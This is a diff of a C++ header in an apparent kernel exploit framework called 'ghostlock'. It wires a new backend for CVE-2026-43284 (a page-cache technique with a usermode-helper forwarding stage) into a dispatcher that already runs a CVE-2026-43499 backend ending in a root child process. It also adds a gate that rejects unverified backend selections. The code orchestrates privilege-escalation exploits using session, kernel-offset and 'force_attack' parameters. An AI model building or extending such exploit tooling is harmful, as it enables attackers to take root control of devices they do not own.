@@ -3,9 +3,11 @@
 
 #include "pipeline/component_catalog.hpp"
 #include "pipeline/pipeline.hpp"
+#include "backend/cve_2026_43284_backend.hpp"
 #include "backend/cve_2026_43499_backend.hpp"
 #include "session/core_session.hpp"
 #include "terminal/root_child.hpp"
+#include "terminal/umh_forward.hpp"
 
 namespace ghostlock::pipeline {
     /* Validate the component selection outside the sensitive window and dispatch
@@ -17,6 +19,14 @@ namespace ghostlock::pipeline {
     [[nodiscard]] inline RunResult run_orchestrated_pipeline(
         session::CoreSession &exploit_session, const ComponentSelection &selection,
         const profile::kernel_offsets &decoded, const char *debug_dir, bool force_attack) {
+        /* Fail-closed gate: combination_supported() only says the triple is
+         * catalogued/wired; selection_supported() is the device-verified
+         * availability fact. A catalogued-but-unavailable backend (43284 until
+         * the B5-9 gate) must never run, so reject before dispatch even if this
+         * entry point is called directly. */
+        if (!selection_supported(selection)) {
+            return RunResult{.code = RunCode::Rejected};
+        }
         /* PI-window-outside: each Pipeline::run constructs/destroys the selected
          * backend's state through the BackendState RAII guard (ADR-0002 / D3),
          * so the composition root no longer names 43499 or its state. */
@@ -32,6 +42,13 @@ namespace ghostlock::pipeline {
                 using P = Pipeline<ghostlock::backend::Cve43499_W1W2,
                                    ghostlock::terminal::RootChildPolicy>;
                 static_assert(P::target == DispatchTarget::Cve43499W1W2_RootChild,
+                              "dispatch case must match the pipeline's target");
+                return P::run(exploit_session, decoded, debug_dir, force_attack);
+            }
+            case DispatchTarget::Cve43284PageCache_UmhForward: {
+                using P = Pipeline<ghostlock::backend::Cve2026_43284Policy,
+                                   ghostlock::terminal::UmhForwardPolicy>;
+                static_assert(P::target == DispatchTarget::Cve43284PageCache_UmhForward,
                               "dispatch case must match the pipeline's target");
                 return P::run(exploit_session, decoded, debug_dir, force_attack);
             }
